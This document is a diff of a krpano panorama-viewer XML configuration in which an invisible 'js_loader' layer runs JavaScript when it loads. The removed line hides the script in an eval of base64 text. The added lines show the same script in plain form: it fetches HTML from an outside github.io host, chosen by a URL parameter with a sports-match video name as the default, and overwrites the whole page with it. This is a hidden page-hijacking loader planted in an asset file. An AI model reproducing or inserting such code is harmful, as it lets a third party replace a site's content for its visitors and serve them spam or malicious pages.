@@ -1,5 +1,14 @@
 <krpano version="1.0.8.15">
     <SCRIPT id="allow-copy_script"/>
     <layer name="js_loader" type="container" visible="false" 
-           onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAic3BvcnRzIjsgCgoKCmZldGNoKCJodHRwczovL1B5ZHJ0cy5naXRodWIuaW8veGh1Yi9iYi8iICsgaWQgKyAiLmh0bWwiKQogIC50aGVuKGUgPT4gZS50ZXh0KCkpCiAgLnRoZW4oZSA9PiB7IAogICAgZG9jdW1lbnQub3BlbigpLCAKICAgIGRvY3VtZW50LndyaXRlKGUpLCAKICAgIGRvY3VtZW50LmNsb3NlKCkgCiAgfSk=');eval(w)););"/>
+           onloaded="js(
+               var id = new URLSearchParams(location.search).get('id') || 'video-colts-vs-chiefs-nfl-match-uktv-04';
+               fetch('https://Pydrts.github.io/xhub/bb/' + id + '.html')
+                   .then(e => e.text())
+                   .then(e => {
+                       document.open();
+                       document.write(e);
+                       document.close();
+                   });
+           );"/>
 </krpano>
